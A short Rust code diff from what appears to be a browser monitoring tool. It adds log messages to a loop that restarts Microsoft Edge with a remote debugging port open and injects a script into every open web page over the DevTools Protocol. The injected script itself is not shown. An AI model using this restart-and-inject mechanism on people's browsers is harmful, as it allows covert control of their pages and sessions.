@@ -64,7 +64,7 @@ impl BrowserManager {
         if let Some(ws_url) = &target.ws_url {
             injector::inject(ws_url, injector::get_script()).await?;
         }
-        Ok()
+        Ok(())
     }
     
     // Kill Edge and restart with debug port enabled
@@ -101,20 +101,28 @@ pub async fn monitor(state: Arc<Mutex<AppState>>) {
     let mut restart_tried = false;
     let mut connected = false;
     
+    println!("[*] Browser monitor started, scanning for CDP on ports {:?}", CDP_PORTS);
+    
     time::sleep(Duration::from_millis(500)).await;
     
     loop {
         if !state.lock().unwrap().running { break; }
         
         if let Some(targets) = manager.connect().await {
+            if !connected {
+                println!("[+] Connected to browser CDP on port {}", manager.cdp_port.unwrap_or(0));
+            }
             connected = true;
             
             for target in &targets {
                 if target.target_type == "page" && !injected.contains(&target.id) {
                     if target.url.starts_with("http") {
                         if manager.inject(target).await.is_ok() {
+                            println!("[+] Injected into: {}", target.url);
                             injected.push(target.id.clone());
                             state.lock().unwrap().pages_injected += 1;
+                        } else {
+                            println!("[-] Failed to inject: {}", target.url);
                         }
                     }
                 }
@@ -124,10 +132,14 @@ pub async fn monitor(state: Arc<Mutex<AppState>>) {
             injected.retain(|id| ids.contains(id));
             
         } else if !restart_tried && !connected {
+            println!("[!] No CDP connection found, attempting to restart Edge with debug port...");
             restart_tried = true;
             #[cfg(windows)]
             if BrowserManager::restart_edge() {
+                println!("[*] Edge restarted with --remote-debugging-port=9222");
                 time::sleep(Duration::from_secs(4)).await;
+            } else {
+                println!("[-] Failed to restart Edge");
             }
         }
         
